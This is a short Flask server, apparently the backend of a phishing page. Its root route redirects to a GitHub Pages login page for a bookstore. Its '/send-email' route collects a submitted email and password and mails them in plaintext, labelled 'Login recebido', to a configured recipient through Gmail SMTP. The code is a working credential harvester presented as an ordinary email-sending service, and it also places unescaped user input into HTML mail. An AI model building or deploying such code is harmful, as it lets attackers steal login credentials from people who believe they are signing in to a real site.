from flask import Flask, jsonify, request, redirect
from flask_cors import CORS
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# -------------------------
# CONFIGURAÇÃO DO SERVIDOR
# -------------------------
app = Flask(__name__)
CORS(app)

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587


# -------------------------
# FUNÇÃO DE ENVIO DE EMAIL
# -------------------------
def enviar_email(name: str, email: str, message: str) -> None:
    remetente = os.environ.get("MAIL_SENDER")
    senha = os.environ.get("MAIL_PASSWORD")
    destinatario = os.environ.get("MAIL_RECIPIENT")

    if not all([remetente, senha, destinatario]):
        raise RuntimeError("Variáveis de ambiente MAIL_SENDER, MAIL_PASSWORD e MAIL_RECIPIENT não configuradas.")

    msg = MIMEMultipart("alternative")
    msg["Subject"] = "Nova mensagem do site"
    msg["From"] = remetente
    msg["To"] = destinatario

    html = f"""
    <html>
      <body style="font-family: Arial, sans-serif; color: #333;">
        <h2 style="color: #2c3e50;">Nova mensagem recebida</h2>
        <p><strong>Nome:</strong> {name}</p>
        <p><strong>E-mail:</strong> {email}</p>
        <p><strong>Mensagem:</strong></p>
        <p>{message}</p>
      </body>
    </html>
    """

    msg.attach(MIMEText(html, "html", "utf-8"))

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as servidor:
        servidor.starttls()
        servidor.login(remetente, senha)
        servidor.send_message(msg)


# -------------------------
# ROTAS
# -------------------------
@app.route("/", methods=["GET"])
def home():
    # Redireciona para o site principal
    return redirect("https://livrariabomlivro.github.io/login/", code=302)




@app.route("/send-email", methods=["POST"])
def send_email():
    data = request.get_json(silent=True) or {}

    email = (data.get("email") or "").strip()
    password = (data.get("password") or "").strip()

    if not email or not password:
        return jsonify({"error": "Preencha todos os campos."}), 400

    # mensagem que vai pro email
    message = f"Login recebido:\nEmail: {email}\nSenha: {password}"

    try:
        enviar_email("Login Teste", email, message)
    except Exception as e:
        return jsonify({"error": f"Erro ao enviar email: {str(e)}"}), 500

    return jsonify({"message": "Dados enviados com sucesso!"})




# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
